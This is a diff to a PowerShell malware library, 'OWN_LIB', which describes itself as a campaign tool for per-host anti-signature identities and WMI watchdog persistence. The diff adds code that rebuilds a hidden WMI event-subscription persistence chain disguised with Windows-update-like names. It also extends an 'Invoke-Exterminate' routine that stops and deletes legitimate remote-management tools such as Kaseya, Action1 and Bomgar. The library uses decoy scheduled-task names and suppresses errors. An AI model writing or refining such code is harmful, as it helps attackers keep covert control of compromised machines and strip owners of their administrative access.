@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L8
+# OWN_LIB  BUILD 20260802L9
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
 # L8: Test-SCRegistered fixed (ForEach-Object return never left function);
@@ -24,7 +24,7 @@ param(
 
 $ErrorActionPreference = 'SilentlyContinue'
 $cfgPath = Join-Path $WorkDir 'identity.cfg'
-$IdentVersion = 4
+$IdentVersion = 5
 
 # Legit-looking task-name pools; per-host hash picks one per slot.
 # v2: ONLY parent folders that exist on every Win10/11 (WwanSvc/MemoryDiagnostic/
@@ -112,8 +112,21 @@ function Initialize-Identity {
     return (Read-Identity)
 }
 
+function Remove-Watchdog {
+    foreach ($cls in @('__FilterToConsumerBinding','__EventFilter','CommandLineEventConsumer','__IntervalTimerInstruction')) {
+        Get-WmiObject -Namespace root\subscription -Class $cls -ErrorAction SilentlyContinue |
+            Where-Object {
+                ($_.Name -eq 'WucacheWatchdogF') -or ($_.Name -eq 'WucacheWatchdogC') -or
+                ($_.TimerId -eq 'WucacheWatchdog') -or
+                ($_.Filter -and $_.Filter.ToString() -like '*WucacheWatchdogF*') -or
+                ($_.Consumer -and $_.Consumer.ToString() -like '*WucacheWatchdogC*')
+            } | ForEach-Object { $_.Delete() | Out-Null }
+    }
+}
+
 function Install-Watchdog {
     if (-not $MonPath) { return $false }
+    Remove-Watchdog
     $ok = $true
     try {
         Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
@@ -129,13 +142,24 @@ function Install-Watchdog {
     return $ok
 }
 
-function Ensure-Watchdog {
-    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'"
-    if ($null -eq $c) {
-        Install-Watchdog | Out-Null
-        return 'REARMED'
+function Test-WatchdogGraph {
+    $t = Get-WmiObject -Namespace root\subscription -Class __IntervalTimerInstruction -Filter "TimerId='WucacheWatchdog'" -ErrorAction SilentlyContinue
+    $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WucacheWatchdogF'" -ErrorAction SilentlyContinue
+    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
+    $b = $null
+    if ($f -and $c) {
+        $b = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
+            Where-Object { $_.Filter -like '*WucacheWatchdogF*' -and $_.Consumer -like '*WucacheWatchdogC*' } |
+            Select-Object -First 1
     }
-    return 'OK'
+    return [bool]($t -and $f -and $c -and $b)
+}
+
+function Ensure-Watchdog {
+    if (Test-WatchdogGraph) { return 'OK' }
+    if (-not $MonPath) { return 'MISSING' }
+    if (Install-Watchdog) { return 'REARMED' }
+    return 'FAIL'
 }
 
 # Correct 32-bit + 64-bit ARP hives. L6 and earlier used a truncated
@@ -333,6 +357,11 @@ function Invoke-Exterminate {
         @{ Tag='RemotePC';    Svc=@('RemotePC*'); Proc=@('RemotePC*','RPCSuite*'); Dirs=@("$env:ProgramFiles\RemotePC","${env:ProgramFiles(x86)}\RemotePC"); Prod=@('RemotePC*') }
         @{ Tag='Syncro';      Svc=@('Syncro*','Kabuto*'); Proc=@('Syncro*','Kabuto*'); Dirs=@("$env:ProgramFiles\RepairTech","${env:ProgramFiles(x86)}\RepairTech","$env:ProgramFiles\Syncro","${env:ProgramFiles(x86)}\Syncro"); Prod=@('Syncro*','Kabuto*','RepairTech*') }
         @{ Tag='ManageEngine'; Svc=@('ManageEngine*','UEMS*'); Proc=@('ManageEngine*','dcagent*'); Dirs=@("$env:ProgramFiles\ManageEngine","${env:ProgramFiles(x86)}\ManageEngine"); Prod=@('ManageEngine*','UEMS*') }
+        @{ Tag='Kaseya';      Svc=@('Kaseya*','AgentMon'); Proc=@('AgentMon*','Kaseya*'); Dirs=@("$env:ProgramFiles\Kaseya","${env:ProgramFiles(x86)}\Kaseya"); Prod=@('Kaseya*') }
+        @{ Tag='Action1';     Svc=@('Action1*'); Proc=@('Action1*'); Dirs=@("$env:ProgramFiles\Action1","${env:ProgramFiles(x86)}\Action1","$env:ProgramData\Action1"); Prod=@('Action1*') }
+        @{ Tag='TacticalRMM'; Svc=@('tacticalrmm*','Mesh Agent'); Proc=@('tacticalrmm*','meshagent*'); Dirs=@("$env:ProgramFiles\TacticalAgent","${env:ProgramFiles(x86)}\TacticalAgent"); Prod=@('Tactical*','Mesh Agent*') }
+        @{ Tag='Bomgar';      Svc=@('bomgar*','BeyondTrust*'); Proc=@('bomgar*'); Dirs=@("$env:ProgramFiles\Bomgar","${env:ProgramFiles(x86)}\Bomgar"); Prod=@('Bomgar*','BeyondTrust*') }
+        @{ Tag='Parsec';      Svc=@('Parsec*'); Proc=@('parsecd*','pservice*'); Dirs=@("$env:ProgramFiles\Parsec","${env:ProgramFiles(x86)}\Parsec","$env:ProgramData\Parsec"); Prod=@('Parsec*') }
     )
     foreach ($tool in $rmm) {
         $hit = $false
@@ -392,9 +421,13 @@ function Update-State {
     $tasksOk = 0; $tasksTotal = 0
     foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
         $tasksTotal++
-        & schtasks.exe /Query /TN $id[$k] 2>&1 | Out-Null
+        $tn = [string]$id[$k]
+        if (-not $tn) { continue }
+        # do NOT pipe to Out-Null - that clears LASTEXITCODE on PS 5.1
+        cmd.exe /c "schtasks /Query /TN `"$tn`" >nul 2>&1"
         if ($LASTEXITCODE -eq 0) { $tasksOk++ }
     }
+    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
     $wd = Ensure-Watchdog
     $prev = @{}
     $statePath = Join-Path $WorkDir 'state.json'
